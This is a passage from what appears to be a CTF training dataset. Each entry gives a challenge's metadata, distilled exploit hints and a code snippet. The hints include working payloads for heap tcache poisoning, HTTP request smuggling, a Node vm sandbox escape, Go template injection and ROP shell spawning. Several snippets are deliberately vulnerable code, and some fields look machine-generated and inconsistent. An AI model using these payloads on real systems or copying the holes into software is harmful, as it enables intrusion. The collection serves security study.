        "knowledge": [
            "When exploiting a use-after-free vulnerability, manipulating the program's control flow to copy the same index onto itself can trigger the vulnerability, allowing for heap address leakage. This technique can be further exploited to perform arbitrary actions such as File Structure Oriented Programming (FSOP) by compromising the heap's integrity.\n   ```\n   add(1, 0x10)\n   copy(1, 1)\n   show(1) # Triggers use-after-free, leaking heap address\n   ```",
            "Tcache poisoning can be achieved by carefully crafting heap operations to manipulate the tcache's linked list. By overwriting a freed chunk's metadata, such as the `tcache->key`, it's possible to perform a double-free without detection by libc's security checks (applicable to libc version 2.31, which has protections against tcache double frees). This method allows for the creation of overlapped chunks, enabling arbitrary write operations through controlled use of the tcache.\n   ```\n   add(1, 0x10)\n   copy(1, 1)\n   edit(1, p64(heap_base+0x100)) # Overwrites tcache->key\n   copy(1, 1) # Performs tcache double free, incrementing tcache->next\n   copy(1, 2) # Further manipulates tcache->next\n   ```"
        ],
        "key": "```c\nvoid RC_put(Note *note) {\n    if (note->ref_count > 0) {\n        note->ref_count--;\n        if (note->ref_count == 0) {\n            free(note->content);\n        }\n    }\n}\n\nvoid copy(Note *src, Note *dst) {\n    if (src == dst) {\n        RC_put(src);\n    }\n    dst->content = src->content;\n    src->ref_count++;\n}\n```"
    },
    {
        "name": "Regexicide",
        "write_up": "dataset/raw/Regexicide.md",
        "type": "web",
        "competition": [
            "FacebookCTF/2019",
            "https://ctftime.org/event/781/tasks/"
        ],
        "score": 1000,
        "max_score": 1000,
        "difficulty": 1.0,
        "knowledge": [
            "When confronting a challenge involving a server with HHVM (HipHop Virtual Machine), and if admin functions are exposed and unauthenticated, exploring provided admin functionalities like `/static-strings`, `/dump-static-strings`, or `/random-static-strings` can lead to sensitive data exposure. This is particularly useful in situations where the server stores static strings that may include secrets or flags.",
            "In the scenario where the application exposes an endpoint that allows extracting static strings, leveraging parameters such as `count` to control the number of strings returned can optimize the retrieval of all static strings, potentially including secret keys or flags. Example payload for retrieving static strings in bulk might be: `http://<target-host>:<port>/random-static-strings?count=1000`. This approach is preferable to brute-forcing or manually querying for strings as it minimizes requests and maximizes efficiency in flag extraction."
        ],
        "key": "```python\nimport re\n\ndef check_password(input_password, stored_password):\n    # Vulnerable regex pattern allowing catastrophic backtracking\n    pattern = re.compile(r\"^(.*\" + re.escape(stored_password) + r\")+$\")\n    return pattern.match(input_password) is not None\n\n# Example usage\nstored_password = \"secret\"\ninput_password = \"secretsecret\"\nprint(check_password(input_password, stored_password))\n```"
    },
    {
        "name": "regulus-satrapa",
        "write_up": "dataset/raw/regulus-satrapa.md",
        "type": "crypto",
        "competition": [
            "HSCTF/2021",
            "https://ctftime.org/event/1264/tasks/"
        ],
        "score": 447,
        "max_score": 493,
        "difficulty": 0.9066937119675457,
        "knowledge": [
            "When given portions of the factors of an RSA key (such as the top half of \\(p\\) and the bottom half of \\(q\\)), these halves can be combined with the modulus \\(n\\) to recover the full factors. This involves calculating the inverse modulus of the known half of \\(q\\) against \\(2^{512}\\), multiplying it by the modulus \\(n\\), and then applying the modulus of \\(2^{512}\\) to find the missing half of \\(p\\). Finally, combine the known half with the newly found half to recover the full factor. This method allows the reconstruction of \\(p\\) and \\(q\\) even when only portions of them are known, enabling the decryption of the ciphertext:\n\nExample code snippet to recover low bits of \\(p\\):\n```python\nfrom Crypto.Util.number import inverse\n# Given values: n, q_low\np_low = n * inverse(q_low, 2**512) % 2**512\n```",
            "An alternative method for recovering RSA factors when partial information is available involves calculating the high bits of one factor using the high bits of the other. After dividing the modulus \\(n\\) by the shifted high bits of \\(p\\), the result is then shifted to isolate the high bits of \\(q\\), which, when combined with the known lower bits of \\(q\\), fully recovers \\(q\\). This method might need adjustments for the missing lower bits' influence, but provides a means to deduce the factor without direct knowledge of its lower half. This approach demonstrates flexibility in factor recovery strategies for RSA encryption, which can be crucial when direct methods are not applicable.\n\nExample code to calculate high bits of \\(q\\) and recover \\(q\\):\n```python\n# Adjusted from given values: n, p_high, q_low\nq_high = n // (p_high << 512) >> 512\nq = q_high << 512 | q_low\n```"
        ],
        "key": "```python  \nfrom Crypto.Util.number import *  \nimport binascii  \nflag = open('flag.txt','rb').read()  \np = getPrime(1024)  \nq = getPrime(1024)  \nn = p*q  \ne = 2**16+1  \npt = int(binascii.hexlify(flag).decode(),16)  \nprint(p>>512)  \nprint(q%(2**512))  \nprint(n, e)  \nprint(pow(pt,e,n))  \n```"
    },
    {
        "name": "Relatively Simple Algorithm",
        "write_up": "dataset/raw/Relatively Simple Algorithm.md",
        "type": "crypto",
        "competition": [
            "angstrom/2021",
            "https://ctftime.org/event/1265/tasks/"
        ],
        "score": 40,
        "max_score": 300,
        "difficulty": 0.13333333333333333,
        "knowledge": [
            "In RSA encryption challenges, calculating the decryption exponent `d` is critical for decrypting the ciphertext. This can be accomplished when the prime factors of the modulus `n` (i.e., `p` and `q`) are known, using the formula `d = pow(e, -1, (p-1)*(q-1))`. This is applicable in scenarios where the RSA modulus `n` can be factored into its prime constituents `p` and `q`.",
            "Once the decryption exponent `d` is known, the plaintext message `m` can be recovered from the ciphertext `c` using the formula `m = pow(c, d, n)`. This decryption process involves modular exponentiation and is utilizable in scenarios where the RSA parameters (`c`, `d`, and `n`) are known. The plaintext, typically represented in hexadecimal format, can be converted back to a readable string (if it represents ASCII values).\n   \nExample payload for decryption and conversion to string:\n```python\nd = pow(e, -1, (p-1)*(q-1))\nplaintext_hex = hex(pow(c, d, n)).rstrip(\"L\")\nflag = bytearray.fromhex(plaintext_hex[2:]).decode()\nprint(flag)\n```"
        ],
        "key": "```python\nfrom Crypto.Util.number import getStrongPrime  \nf = [REDACTED]  \nm = int.from_bytes(f,'big')  \np = getStrongPrime(512)  \nq = getStrongPrime(512)  \nn = p*q  \ne = 65537  \nd = pow(e,-1,(p-1)*(q-1))  \nc = pow(m,e,n)  \nprint(\"n =\",n)  \nprint(\"p =\",p)  \nprint(\"q =\",q)  \nprint(\"e =\",e)  \nprint(\"c =\",c)\n```"
    },
    {
        "name": "Release the (g)Unicorn",
        "write_up": "dataset/raw/Release the (g)Unicorn.md",
        "type": "web",
        "competition": [
            "UACWS/2022",
            "https://ctftime.org/event/1674/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When investigating web applications, examining the source code for hidden endpoints can uncover improperly secured paths that might allow unauthorized access to sensitive data or functionalities. In scenarios where direct access to certain endpoints is restricted (like a 403 Forbidden error when attempting to access the /flag endpoint), scrutinizing the web server or application server's version for known vulnerabilities can be key. This approach is particularly effective if the server software is outdated or poorly configured.",
            "HTTP request smuggling can be utilized to bypass security restrictions enforced by intermediate devices (like proxies or web application firewalls) within a web application architecture. This technique is applicable when the application is served by vulnerable server software that misinterprets the sequence of HTTP requests. Crafting a malicious payload that takes advantage of these vulnerabilities (such as the one found in gunicorn 20.0.4) can allow attackers to smuggle unauthorized requests to access restricted endpoints. A sample payload for exploiting HTTP request smuggling in scenarios where gunicorn is vulnerable:\n\n    ```bash\n    GET /admin HTTP/1.1  \n    Host: cybersecweek.ua.pt:2005  \n    Content-Length: 78  \n    Sec-Websocket-Key1: x\n\n    xxxxxxxxGET /flag HTTP/1.1  \n    Host: cybersecweek.ua.pt:2005  \n    Content-Length: 48\n\n    GET / HTTP/1.1  \n    Host: cybersecweek.ua.pt:2005\n    ```"
        ],
        "key": "```python  \n@app.route('/flag')  \ndef flag():  \n   with open('flag', 'r') as f:  \n       return f.read()  \n```"
    },
    {
        "name": "Reptilian Server",
        "write_up": "dataset/raw/Reptilian Server.md",
        "type": "The type of this CTF challenge is ***pwn*** (short for \"exploit\") since the objective is to exploit a vulnerability in the server's code to run unauthorized commands and gain access to sensitive information, such as the flag.",
        "competition": [
            "SwampCTF/2024",
            "https://ctftime.org/event/2138/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When encountering sandbox environments in challenges, such as those implemented using nodejs' `vm` package, it is possible to escape the sandbox by leveraging the parent constructor's methods despite the sandbox's intended restrictions. This bypass is feasible because the `vm` module does not effectively isolate the sandboxed code from accessing the parent constructors, allowing the execution of arbitrary code within the host environment. A suitable approach to escape the sandbox involves using `this.constructor.constructor(\"return [code]\")()` to execute the arbitrary code. \n   Example payload: `this.constructor.constructor(\"return process.env\")()`",
            "In challenges where input is validated for specific constraints, such as the absence of spaces or a maximum character length, alternative encoding methods or characters recognized by the language parser but not by the validation logic can be used to circumvent these restrictions. For Node.js applications, using Unicode characters like `0xa0` (non-breaking space) instead of regular spaces allows bypassing space restrictions. Additionally, breaking down the payload into smaller chunks can help overcome character length limitations without altering the intended functionality of the exploit.\n   Example payload: \n   ```\n   c=this.constructor.constructor\n   x=\"return\\xa0process.env\"\n   console.log(c(x)())\n   ```"
        ],
        "key": "```javascript\nconst vm = require('node:vm');  \nconst net = require('net');\n\n// Get the port from the environment variable (default to 3000)  \nconst PORT = process.env.PORT || 3000;\n\n// Create a TCP server  \nconst server = net.createServer((sock) => {  \n    console.log('Client connected!');  \n    sock.write(`Welcome to the ReptilianRealm! Please wait while we setup the virtual environment.\\n`);\n\n    const box = vm.createContext(Object.create({  \n        console: {  \n            log: (output) => {  \n                sock.write(output + '\\n');  \n            }  \n        },  \n        eval: (x) => eval(x)  \n    }));\n\n    sock.write(`Environment created, have fun playing with the environment!\\n`);\n\n    sock.on('data', (data) => {  \n        const c = data.toString().trim();\n\n        if (c.indexOf(' ') >= 0 || c.length > 60) {  \n            sock.write(\"Intruder Alert! Removing unwelcomed spy from centeralized computing center!\");  \n            sock.end();  \n            return;  \n        }\n\n        try {  \n            const s = new vm.Script(c);  \n            s.runInContext(box, s);  \n        } catch (e) {  \n            sock.write(`Error executing command: ${e.message} \\n`);  \n        }  \n    });\n\n    sock.on('end', () => { console.log('Client disconnected!'); });  \n});\n\n// Handle server errors  \nserver.on('error', (e) => {  \n    console.error('Server error:', e);  \n});\n\n// Start the server listening on correct port.  \nserver.listen(PORT, () => {  \n    console.log(`Server listening on port ${PORT}`);  \n});\n```"
    },
    {
        "name": "Request Bin",
        "write_up": "dataset/raw/Request Bin.md",
        "type": "pwn",
        "competition": [
            "WeCTF/2022",
            "https://ctftime.org/event/1546/tasks/"
        ],
        "score": 1610,
        "max_score": 2815,
        "difficulty": 0.5719360568383659,
        "knowledge": [
            "In challenges involving Golang templating engines, a Server-Side Template Injection (SSTI) vulnerability can be exploited if public functions of a struct passed to the templating system are callable. The exploitability of a function depends on its signature; it must return either one value or one value along with an error to be considered viable for invocation in an SSTI context. Functions returning more than this are not exploitable in this scenario.",
            "Identification and exploitation of an SSTI vulnerability in a Golang templating scenario can be achieved through error messages by attempting to access a non-existent property within the template. This method helps to reveal the struct type being passed to the templating engine, which can then be investigated for exploitable functions. In the described scenario, exploiting the `.Ctx` variable's `SendFile` function allows for arbitrary file read, provided the function's requirements are met (i.e., the correct number and types of arguments are supplied).\n   - Example payload to exploit the SSTI for arbitrary file read: `{{ .Ctx.SendFile \"/flag\" \"flag.txt\"}}`"
        ],
        "key": "```go\ntype Log struct {\n\tCtx *context.Context `json:\"-\" yaml:\"-\" toml:\"-\"`\n}\n\nfunc (ctx *Context) SendFile(src string, destName string) error {\n\t// Function implementation\n}\n\n{{ .Ctx.SendFile \"/flag\" \"result.txt\"}}\n```"
    },
    {
        "name": "required",
        "write_up": "dataset/raw/required.md",
        "type": "crypto",
        "competition": [
            "DigitalOverdose/2021",
            "https://ctftime.org/event/1459/tasks/"
        ],
        "score": -1.0,
        "max_score": 600,
        "difficulty": -1,
        "knowledge": [
            "In reversing challenges involving encrypted flag computations within a codebase comprising multiple files with operations such as addition, subtraction, bitwise operations, and shifts, examining each file to understand the sequence and type of operations performed can be effective. Many times, these operations are invertible, and reversing their order while inverting each operation can reveal the original data or flag. \n   \n   - For operations that inherently have inverse operations (like addition/subtraction, XOR, or rotations), writing a script that performs these inverse operations in the reverse sequence can decrypt the data.\n   - Example for a single byte operation inversion: If `f[0] ^= 0x1F`, the inversion would be `f[0] ^= 0x1F` again as XOR is its own inverse.",
            "When automating the analysis of complex code execution flows, especially in scenarios with heavy use of dynamic imports (like `require` in Node.js) and operations that mutate state, instrumenting the code to log or output the execution path and state changes can provide insight into the data manipulation process. This can be particularly useful in environments where debugging might otherwise be challenging due to the dynamic nature of the execution.\n\n   - An implementation strategy involves appending logging instructions to each file or each relevant operation. This can highlight the series of transformations applied to data.\n   - Example for operator logging: Adding `console.log(`Operation: f[${i}] ^= 0x1F`)` to output the operation being performed."
        ],
        "key": "```javascript\nmodule.exports=(i,j,t)=>(i%=30,j%=30,t%=30,i+=[],j+\"\",t=(t+{}).split(\"[\")[0],f[i]*=-1,f[i]&=0xff)\n```"
    },
    {
        "name": "Resolve",
        "write_up": "dataset/raw/Resolve.md",
        "type": "pwn",
        "competition": [
            "UTCTF/2021",
            "https://ctftime.org/event/1177/tasks/"
        ],
        "score": 980,
        "max_score": 1000,
        "difficulty": 0.98,
        "knowledge": [
            "In challenges without Position Independent Executable (PIE) and stack canary protections, ret2dlresolve technique can be used to execute arbitrary code by leveraging dynamic linking and loading mechanisms. This technique is particularly useful when direct references to system functions are not available in the binary. Utilize tools like pwntools to create a payload that resolves the address of required functions (e.g., system) at runtime. Example payload snippet:\n```python\nd = pwn.Ret2dlresolvePayload(e, symbol=\"system\", args=[\"sh\"])\nr.ret2dlresolve(d)\npayload = pwn.fit({0x10: r.chain()}) + b\"\\n\" + d.payload\n```",
            "When creating an exploit for binaries with an overflow vulnerability, as demonstrated by use of `gets` function which does not limit input length, it's effective to align the stack before redirecting execution flow. This can be achieved by using a ret gadget (a gadget that simply consists of a ret instruction) before executing the rest of the payload. This is crucial in scenarios where the binary has protections like NX enabled, requiring precise control over the stack to execute a ret2dlresolve or similar attack. Example snippet for stack alignment:\n```python\nr.raw(0x401159)  # ret gadget to align stack\n```"
        ],
        "key": "```c\nint main() {  \n char buf[8];  \n gets(buf);  \n return 0;  \n}\n```"
    },
    {
        "name": "Return of the Intro to Netcat",
        "write_up": "dataset/raw/Return of the Intro to Netcat.md",
        "type": "misc",
        "competition": [
            "HSCTF/2021",
            "https://ctftime.org/event/1264/tasks/"
        ],
        "score": 160,
        "max_score": 493,
        "difficulty": 0.32454361054766734,
        "knowledge": [
            "When encountering challenges requiring a proof-of-work (PoW) solution before access is granted, utilize external solver scripts provided by the challenge, typically accessible via a URL. These scripts often automate the process of solving the PoW challenge, thus allowing for quicker access to the actual challenge component. After obtaining the solution from the script, it must be submitted back to the server to proceed. Example command: `python3 <(curl -sSL [solver URL]) solve [PoW token]`.",
            "Utilize netcat (nc) to interact with remote servers as specified in challenge instructions. This tool is essential for communicating with the challenge server, sending inputs (such as PoW solutions), and receiving outputs (such as flags). Always ensure to first solve any prerequisite steps (e.g., PoW) before expecting the actual content or flag to be served by the remote challenge. Example usage: `nc [domain] [port]`, followed by submitting any required solutions obtained from earlier steps."
        ],
        "key": "```python\nimport socket\n\ndef vulnerable_netcat_server():\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_socket.bind(('0.0.0.0', 1337))\n    server_socket.listen(1)\n    print(\"Server listening on port 1337\")\n\n    while True:\n        client_socket, addr = server_socket.accept()\n        print(f\"Connection from {addr}\")\n\n        client_socket.send(b\"== proof-of-work: enabled ==\\n\")\n        client_socket.send(b\"please solve a pow first\\n\")\n        client_socket.send(b\"You can run the solver with:\\n\")\n        client_socket.send(b\"   python3 <(curl -sSL https://goo.gle/kctf-pow) solve\\n\")\n        client_socket.send(b\"s.AACF.AAD1NSzaviS15ewE/zJ3lZFb\\n\")\n        client_socket.send(b\"===================\\n\\nSolution?\\n\")\n\n        solution = client_socket.recv(1024).strip()\n        if solution == b\"s.AAB8PXCCRqChJ7WzDBUzjUv6t61ISzLAaSuK5R5W0k/y1gafBydG/gOOgIRgsaudj9OR7ZB2h2PhArYDhQEPFps3wZH2R7NodkCReoUPXoZxHRY2ntcztiZck5lKGxq8bmoYdpW4LWHQ+oTiJ+lVh0P6aB3vN63LXwzzUrhX4RLtfR+IjzXGn29JklaAZST/H37zpebVpF+8Np7BdrWHg1sF\":\n            client_socket.send(b\"Correct\\nYou got it! Here's what you're looking for: flag{the_cat_says_meow}\\n\")\n        else:\n            client_socket.send(b\"Incorrect solution\\n\")\n\n        client_socket.close()\n\nvulnerable_netcat_server()\n```"
    },
    {
        "name": "Return Of The ROPs",
        "write_up": "dataset/raw/Return Of The ROPs.md",
        "type": "pwn",
        "competition": [
            "0x41414141/2021",
            "https://ctftime.org/event/1249/tasks/"
        ],
        "score": 480,
        "max_score": 1000,
        "difficulty": 0.48,
        "knowledge": [
            "For challenges that incorporate a Proof-of-Work (PoW) system as an initial step, Python's `itertools`, `hashlib`, and `string` libraries can be used to generate permutations of potential inputs and hash them until the output matches a given hash. This approach is useful in bypassing PoW protections in binary exploitation challenges. Example code snippet for passing PoW:\n```python\nimport itertools, hashlib, string\nprefix = \"given_prefix\" # The prefix provided in the challenge\ntarget_hash = \"target_md5_hash\" # The MD5 hash to match\nfor attempt in itertools.product(string.ascii_lowercase, repeat=4):\n    test_string = prefix + ''.join(attempt)\n    if hashlib.md5(test_string.encode()).hexdigest() == target_hash:\n        print(\"Found matching string:\", test_string)\n        break\n```",
            "In binary exploitation challenges where buffer overflow vulnerabilities are identified, specifically with the presence of functions like `gets`, it's possible to leverage Return-Oriented Programming (ROP) to execute arbitrary code despite NX protections. One effective approach involves leaking libc addresses to bypass ASLR and then using ROP gadgets to call `system(\"/bin/sh\")` to spawn a shell. This strategy is applicable when direct execution control via buffer overflow is hindered by security mechanisms like NX."
        ],
        "key": "```c\n#include <stdio.h>\n\nvoid vulnerable_function() {\n    char buffer[64];\n    gets(buffer);\n}\n\nint main() {\n    vulnerable_function();\n    return 0;\n}\n```"
    },
    {
        "name": "Rev 0",
        "write_up": "dataset/raw/Rev 0.md",
        "type": "reverse",
        "competition": [
            "IJCTF/2020",
            "https://ctftime.org/event/1003/tasks/"
        ],
        "score": 728,
        "max_score": 1000,
        "difficulty": 0.728,
        "knowledge": [
            "In reverse engineering challenges dealing with encoded inputs or where input is processed into an obscure format, constructing a lookup table by mapping encoded representations to their corresponding original characters can significantly simplify the decoding process. This approach is especially useful when the encoding logic for each character is isolated and does not depend on other characters. This allows for the reverse engineering of encoded data without fully understanding or reversing the encoding logic.\n   - Example implementation snippet:\n     ```python\n     def encode_array(input_char):  \n         list2 = [1, 1]  \n         for i in range(8):  \n             two = list2[0] + list2[1]  \n             list2[(ord(input_char) >> (i & 0x1f) & 1 ^ 1)] = two  \n         return list2\n\n     reference = {tuple(encode_array(char)): char for char in string.printable}\n     ```",
            "When dealing with encoded numbers that represent a sequence of processed characters in reverse engineering challenges, applying mathematical operations such as modulo with specific constants can help in deducing the original numbers or sequences. This strategy is effective when the encoding stage transforms characters into numbers using operations that have inverse operations, such as multiplication and addition in a reversible manner.\n   - For instance, if the encoding process involves incremental transformations with multiplication and addition, one can reverse this process with the modulo operation and divisions by the same constants used in the encoding, thereby allowing the recovery of the original sequence from the final numeric representation.\n   - Example implementation snippet:\n     ```python\n     def decode_single_pair(number):  \n         y = number % 0x551  \n         number = (number - x) / 0x551  \n         x = number % 0x551  \n         number = (number - y) / 0x551  \n         return y, x, number\n\n     def decode(number):  \n         rest = number  \n         results = []  \n         while rest != 0:  \n             a, b, rest = decode_single_pair(rest)  \n             results.append([a, b])  \n         return results[::-1]  \n     ```"
        ],
        "key": "```c  \nj = 0;  \nwhile (j < input_length) {  \n k = 0;  \n while (k < 8) {  \n   input_char = *(char *)(j + user_input);  \n   list2_ = PyList_GetItem(encoded_input_list,(long)j,(long)j);  \n   long_value3 = PyList_GetItem(list2_,1);  \n   long_value4 = PyList_GetItem(list2_,0);  \n   added_longs = PyNumber_Add(long_value4,long_value3);  \n   PyList_SetItem(list2_,(input_char >> (k & 0x1f) & 1U ^1),added_longs);  \n   k = k + 1;  \n }  \n j = j + 1;  \n}  \n```\n\n```c  \nlong_value5 = PyLong_FromUnsignedLong(0);  \ni_ = 0;  \nwhile (i_ < input_length) {  \n local_a68 = PyList_GetItem(encoded_input_list,(long)i_,(long)i_);  \n long_value3 = PyLong_FromUnsignedLong(0x551);  \n long_value5 = PyNumber_Multiply(long_value5,long_value3,long_value3);  \n long_value3 = PyList_GetItem(local_a68,0);  \n long_value5 = PyNumber_Add(long_value5,long_value3,long_value3);  \n long_value3 = PyLong_FromUnsignedLong(0x551);  \n long_value5 = PyNumber_Multiply(long_value5,long_value3,long_value3);  \n long_value3 = PyList_GetItem(local_a68,1);  \n long_value5 = PyNumber_Add(long_value5,long_value3,long_value3);  \n i_ = i_ + 1;  \n}  \n```"
    },
    {
        "name": "Rev 1",
        "write_up": "dataset/raw/Rev 1.md",
        "type": "reverse",
        "competition": [
            "IJCTF/2020",
            "https://ctftime.org/event/1003/tasks/"
        ],
        "score": 797,
        "max_score": 1000,
        "difficulty": 0.797,
        "knowledge": [
            "When analyzing a binary that appears to be highly obfuscated, particularly one utilizing techniques like movfuscation, which turns the code into a series of MOV instructions, it is recommended to use specialized deobfuscation tools such as Demovfuscator. This tool can help simplify the binary analysis by either recovering the binary to a less obfuscated form or generating a flowchart representing the binary's logic.",
            "For binaries where conventional analysis methods are inefficient or impractical due to the complexity or obfuscation level (e.g., movfuscated binaries), leveraging performance analysis tools like `perf` can identify the correct input based on the number of instructions executed. This method involves running the binary with different inputs and observing the instruction count changes, potentially revealing how the inputs are processed. An automated script can streamline this process by systematically testing different inputs and comparing the instruction counts to determine the correct sequence towards revealing the flag.\n    - Example bash script snippet for bruteforcing using perf tool:\n    ```bash\n    readarray -t PRINTABLES < <( echo '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&()+,-./:;<=>?@[\\]^_`\\{|\\}~' |  fold -w1 )\n    FLAG=''\n    while [ \"${FLAG: -1}\" != '}' ]; do\n        FLAG=$FLAG$(\n            for C in ${PRINTABLES[@]} ; do\n                INSTRUCTIONS=$(echo \"$FLAG$C\" | perf stat -x: -e instructions:u ./binary 2>&1| grep instruction | cut -d: -f1)\n                echo \"$INSTRUCTIONS:$C\"\n            done | sort -n | head -n1 | cut -d: -f2   \n        )\n        echo $FLAG\n    done\n    ```\n    This script iterates through possible characters, appending them to the flag string and utilizing the performance counter to determine which character yields a change indicative of correct input."
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nint main() {\n    char input[10];\n    printf(\"Login: \");\n    gets(input); // Vulnerable function: gets() allows buffer overflow\n    if (strcmp(input, \"correct_password\") == 0) {\n        printf(\"Welcome!\\n\");\n    } else {\n        printf(\"!!!INTRUDER ALERT!!!\\n\");\n    }\n    return 0;\n}\n```"
    },
    {
        "name": "Reverse a cellular automata",
        "write_up": "dataset/raw/Reverse a cellular automata.md",
        "type": "reverse",
        "competition": [
            "GoogleCTF/2019/Quals",
            "https://ctftime.org/event/809/tasks/"
        ],
        "score": 80,
        "max_score": 500,
        "difficulty": 0.16,
        "knowledge": [
            "When dealing with cellular automata, especially Rule 126, understanding the pattern generation rules is crucial. For Rule 126:\n   - A bit value of '0' is generated by the patterns '000' and '111', whereas a bit value of '1' is generated by all other 3-bit patterns.\n   - The selection of a pattern imposes constraints on subsequent patterns due to the overlap requirement. For instance, if the current pattern is '000', then the subsequent pattern can only be '000' or '001'.",
            "To reverse the cellular automata process effectively, a script that iterates over all valid pattern combinations based on the rules of bit generation and pattern sequencing is needed. The process involves:\n   - Mapping each bit to its potential generating patterns.\n   - Ensuring that each selected pattern is valid by checking it against allowable subsequent patterns based on the last two bits of overlap.\n   - Recursively generating all possible previous steps and checking each against the desired outcome using predefined rules of transformation and overlap. This method drastically reduces the complexity and computation time compared to brute-force approaches."
        ],
        "key": "```python  \nimport sys\n\nif len(sys.argv) != 2:  \n\tprint \"Please supply a hex number on the command line\"  \n\tquit()  \n  \nhexval = sys.argv[1]  \nbit_size = len(hexval)*4\n\n# convert hex value to bit string  \nbitstr = (bin(int(hexval,16))[2:]).zfill(bit_size)\n\n# map from bits to patterns that generate it  \npatterns_generating_bit = {\"0\":[0,7], \"1\":[1,2,3,4,5,6]}\n\n# valid patterns that can follow each pattern; for example, pattern 010 can be\nfollowed  \n#  only by 100 and 101 because they must overlap with its last 2 digits (10)  \nvalid_next_patterns = {0:[0,1], 1:[2,3], 2:[4,5], 3:[6,7], 4:[0,1], 5:[2,3],\n6:[4,5], 7:[6,7]}\n\n# mid bits in each pattern  \npattern_mid_bits = {0:\"0\", 1:\"0\", 2:\"1\", 3:\"1\", 4:\"0\", 5:\"0\", 6:\"1\", 7:\"1\"}\n\ndef reverse_rule126(bitstr, depth, valid_patterns, patterns_in_step):  \n  \n\t# walk through all patterns that generate the current bit  \n\tfor pattern in patterns_generating_bit[bitstr[depth]]:  \n\t\t# make sure the pattern is valid based on previously seen patterns  \n\t\tif pattern in valid_patterns:   \n  \n\t\t\t# if we are not at the last bit - keep going recursively  \n\t\t\tif depth < (bit_size-1):  \n\t\t\t\treverse_rule126(bitstr, depth+1, valid_next_patterns[pattern], patterns_in_step+[pattern])\n\n\t\t\t# if we are at the last bit...  \n\t\t\tif depth == (bit_size-1):  \n\t\t\t\t# ...and the last pattern wraps around properly to the beginning of the step string   \n\t\t\t\tif patterns_in_step[0] in valid_next_patterns[pattern]:  \n  \n\t\t\t\t\t# generate the full bitstring for the step and print it out  \n\t\t\t\t\tfound_step = \"\"  \n\t\t\t\t\tfor x in patterns_in_step:  \n\t\t\t\t\t\tfound_step += pattern_mid_bits[x]  \n\t\t\t\t\tfound_step += pattern_mid_bits[pattern]  \n  \n\t\t\t\t\tprint hex(int(found_step,2))[2:]\n\nreverse_rule126(bitstr, 0, [0,1,2,3,4,5,6,7], [])  \n```"
    },
    {
        "name": "REVMEPLX",
        "write_up": "dataset/raw/REVMEPLX.md",
        "type": "This is a reverse challenge.",
        "competition": [
            "CyberSecurityRumble/2022",
            "https://ctftime.org/event/1665/tasks/"
        ],
        "score": 100,
        "max_score": 960,
        "difficulty": 0.10416666666666667,
        "knowledge": [
            "When analyzing executables for reverse engineering challenges, running `strings` command can reveal hints, hardcoded strings or even parts of a flag directly from the binary. This approach can expose important information without needing to delve deeper into the code or logic of the program. For instance, the `strings` command in the challenge revealed names and parts of the flag, guiding further analysis and interaction with the program.",
            "In scenarios involving calculations or checks against user input, examining the mathematical operations in the source code or decompiled output can reveal how to craft specific inputs to satisfy conditions. If a function performs operations like shifting (right or left) which effectively multiplies or divides the input by powers of two, reversing the operation can help derive the original or required input. For example, if a check involves right-shifting an input by 8 bits and comparing it to a known value, reversing this by left-shifting the known value by 8 bits and then multiplying or dividing appropriately can help deduce the correct input to pass the check. Sample input derived from reversing the operation: `171136.0`."
        ],
        "key": "```c\nif (param_1 * 2 >> 8 == 0x539) {  \n```\n"
    },
    {
        "name": "rev_Evaluation",
        "write_up": "dataset/raw/rev_Evaluation.md",
        "type": "reverse",
        "competition": [
            "LIT/2021",
            "https://ctftime.org/event/1398/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving obfuscated Python code, the use of nested `eval()` functions may be designed to make the code harder to read. Simplifying the expression by systematically removing layers of `eval()` can help in understanding the underlying logic of the code.",
            "When encountering character manipulation through operations like XOR (`^`) and reversal (`[::-1]`), it indicates the process to either obfuscate or deobfuscate a string. To reverse such operations, apply the same operations in the reverse order on the given string to retrieve the original or intended message.  \n**Example Payload:** `''.join([chr(ord(x)^5) for x in 'x6wpf6vZ|w6sZq5kZv4Zk54q1fvpcg5~bdic'])[::-1]`"
        ],
        "key": "```python\nprint(eval(eval(eval(eval(eval(eval(\"''.join([chr(i) for i in\n[39,39,46,106,111,105,110,40,91,99,104,114,40,105,41,32,102,111,114,32,105,32,105,110,32,91,51,57,44,51,57,44,52,54,44,49,48,54,44,49,49,49,44,49,48,53,44,49,49,48,44,52,48,44,57,49,44,57,57,44,49,48,52,44,49,49,52,44,52,48,44,49,48,53,44,52,49,44,51,50,44,49,48,50,44,49,49,49,44,49,49,52,44,51,50,44,49,48,53,44,51,50,44,49,48,53,44,49,49,48,44,51,50,44,57,49,44,53,49,44,53,55,44,52,52,44,53,49,44,53,55,44,52,52,44,53,50,44,53,52,44,52,52,44,52,57,44,52,56,44,53,52,44,52,52,44,52,57,44,52,57,44,52,57,44,52,52,44,52,57,44,52,56,44,53,51,44,52,52,44,52,57,44,52,57,44,52,56,44,52,52,44,53,50,44,52,56,44,52,52,44,53,55,44,52,57,44,52,52,44,53,55,44,53,55,44,52,52,44,52,57,44,52,56,44,53,50,44,52,52,44,52,57,44,52,57,44,53,50,44,52,52,44,53,50,44,52,56,44,52,52,44,52,57,44,52,56,44,53,51,44,52,52,44,53,50,44,52,57,44,52,52,44,53,49,44,53,48,44,52,52,44,52,57,44,52,56,44,53,48,44,52,52,44,52,57,44,52,57,44,52,57,44,52,52,44,52,57,44,52,57,44,53,50,44,52,52,44,53,49,44,53,48,44,52,52,44,52,57,44,52,56,44,53,51,44,52,52,44,53,49,44,53,48,44,52,52,44,52,57,44,52,56,44,53,51,44,52,52,44,52,57,44,52,57,44,52,56,44,52,52,44,53,49,44,53,48,44,52,52,44,53,55,44,52,57,44,52,52,44,53,51,44,52,57,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,52,57,44,52,52,44,53,51,44,53,53,44,52,52,44,53,50,44,53,50,44,52,52,44,53,51,44,53,48,44,52,52,44,53,51,44,53,50,44,52,52,44,53,50,44,53,50,44,52,52,44,53,50,44,53,55,44,52,52,44,53,50,44,53,54,44,52,52,44,53,51,44,53,50,44,52,52,44,53,50,44,53,50,44,52,52,4